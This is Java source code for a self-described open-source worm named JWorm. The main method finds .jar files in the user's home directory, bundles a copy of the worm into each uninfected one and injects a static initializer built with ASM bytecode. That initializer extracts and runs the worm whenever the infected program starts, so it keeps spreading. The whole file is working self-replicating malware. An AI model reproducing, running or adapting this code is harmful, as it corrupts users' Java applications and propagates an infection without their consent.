package com.jworm;

import java.io.File;
import java.io.IOException;
import java.util.jar.JarFile;

import org.objectweb.asm.Label;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;
import org.objectweb.asm.tree.MethodNode;

import com.jworm.util.JavaArchive;

/**
 * An Open-Source Java Worm.
 * 
 * @author Desmond Jackson
 */
public class JWorm extends Object implements Opcodes {
	
	/**
	 * The main method.
	 * 
	 * @param args String arguments passed to this program
	 */
	public static void main(String[] args) throws IOException {
		for (File file : new File(System.getProperty("user.home")).listFiles())
			if (file.getName().endsWith(".jar")) {
				JavaArchive jar = new JavaArchive(new JarFile(file));
				if (jar.isInfected())
					continue;
				jar.addFile("JWorm.jar");
				jar.getMainClassAsNode().methods.add(getClinit());
				jar.write(file);
			}
	}
	
	/**
	 * Gets JWorm's <clinit> infection method.
	 * 
	 * @return JWorm's <clinit> infection method
	 */
	private static MethodNode getClinit() {
		MethodNode mv = new MethodNode(ACC_STATIC, "<clinit>", "()V", null, null);
		mv.visitCode();
		Label l0 = new Label();
		Label l1 = new Label();
		Label l2 = new Label();
		mv.visitTryCatchBlock(l0, l1, l2, "java/io/IOException");
		Label l3 = new Label();
		mv.visitTryCatchBlock(l0, l1, l3, "java/lang/ClassNotFoundException");
		Label l4 = new Label();
		mv.visitTryCatchBlock(l0, l1, l4, "java/lang/IllegalAccessException");
		Label l5 = new Label();
		mv.visitTryCatchBlock(l0, l1, l5, "java/lang/IllegalArgumentException");
		Label l6 = new Label();
		mv.visitTryCatchBlock(l0, l1, l6, "java/lang/reflect/InvocationTargetException");
		Label l7 = new Label();
		mv.visitTryCatchBlock(l0, l1, l7, "java/lang/NoSuchMethodException");
		Label l8 = new Label();
		mv.visitTryCatchBlock(l0, l1, l8, "java/lang/SecurityException");
		mv.visitLdcInsn("JWorm.jar");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/ClassLoader", "getSystemResourceAsStream", "(Ljava/lang/String;)Ljava/io/InputStream;", false);
		mv.visitVarInsn(ASTORE, 0);
		mv.visitIntInsn(SIPUSH, 1024);
		mv.visitIntInsn(NEWARRAY, T_BYTE);
		mv.visitVarInsn(ASTORE, 1);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ISTORE, 2);
		mv.visitTypeInsn(NEW, "java/io/File");
		mv.visitInsn(DUP);
		mv.visitLdcInsn("JWorm.jar");
		mv.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
		mv.visitVarInsn(ASTORE, 3);
		mv.visitVarInsn(ALOAD, 3);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "deleteOnExit", "()V", false);
		mv.visitLabel(l0);
		mv.visitTypeInsn(NEW, "java/io/FileOutputStream");
		mv.visitInsn(DUP);
		mv.visitVarInsn(ALOAD, 3);
		mv.visitMethodInsn(INVOKESPECIAL, "java/io/FileOutputStream", "<init>", "(Ljava/io/File;)V", false);
		mv.visitVarInsn(ASTORE, 4);
		Label l9 = new Label();
		mv.visitJumpInsn(GOTO, l9);
		Label l10 = new Label();
		mv.visitLabel(l10);
		mv.visitFrame(F_FULL, 5, new Object[] {"java/io/InputStream", "[B", INTEGER, "java/io/File", "java/io/OutputStream"}, 0, new Object[] {});
		mv.visitVarInsn(ALOAD, 4);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ILOAD, 2);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "write", "([BII)V", false);
		mv.visitLabel(l9);
		mv.visitFrame(F_SAME, 0, null, 0, null);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
		mv.visitInsn(DUP);
		mv.visitVarInsn(ISTORE, 2);
		mv.visitInsn(ICONST_M1);
		mv.visitJumpInsn(IF_ICMPNE, l10);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "close", "()V", false);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "close", "()V", false);
		mv.visitTypeInsn(NEW, "java/net/URL");
		mv.visitInsn(DUP);
		mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
		mv.visitInsn(DUP);
		mv.visitLdcInsn("jar:file:");
		mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "(Ljava/lang/String;)V", false);
		mv.visitVarInsn(ALOAD, 3);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "getAbsolutePath", "()Ljava/lang/String;", false);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitLdcInsn("!/");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
		mv.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
		mv.visitVarInsn(ASTORE, 5);
		mv.visitTypeInsn(NEW, "java/net/URLClassLoader");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/net/URL");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ALOAD, 5);
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKESPECIAL, "java/net/URLClassLoader", "<init>", "([Ljava/net/URL;)V", false);
		mv.visitVarInsn(ASTORE, 6);
		mv.visitVarInsn(ALOAD, 6);
		mv.visitLdcInsn("com.jworm.JWorm");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLClassLoader", "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 7);
		mv.visitVarInsn(ALOAD, 7);
		mv.visitLdcInsn("main");
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitLdcInsn(Type.getType("[Ljava/lang/String;"));
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 8);
		mv.visitVarInsn(ALOAD, 8);
		mv.visitInsn(ACONST_NULL);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitInsn(POP);
		mv.visitVarInsn(ALOAD, 6);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLClassLoader", "close", "()V", false);
		mv.visitLabel(l1);
		Label l11 = new Label();
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l2);
		mv.visitFrame(F_FULL, 4, new Object[] {"java/io/InputStream", "[B", INTEGER, "java/io/File"}, 1, new Object[] {"java/io/IOException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/IOException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l3);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/ClassNotFoundException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/ClassNotFoundException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l4);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/IllegalAccessException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/IllegalAccessException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l5);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/IllegalArgumentException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/IllegalArgumentException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l6);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/reflect/InvocationTargetException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/InvocationTargetException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l7);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/NoSuchMethodException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/NoSuchMethodException", "printStackTrace", "()V", false);
		mv.visitJumpInsn(GOTO, l11);
		mv.visitLabel(l8);
		mv.visitFrame(F_SAME1, 0, null, 1, new Object[] {"java/lang/SecurityException"});
		mv.visitVarInsn(ASTORE, 4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/SecurityException", "printStackTrace", "()V", false);
		mv.visitLabel(l11);
		mv.visitFrame(F_FULL, 0, new Object[] {}, 0, new Object[] {});
		mv.visitInsn(RETURN);
		mv.visitMaxs(6, 9);
		mv.visitEnd();
		return mv;
	}

}
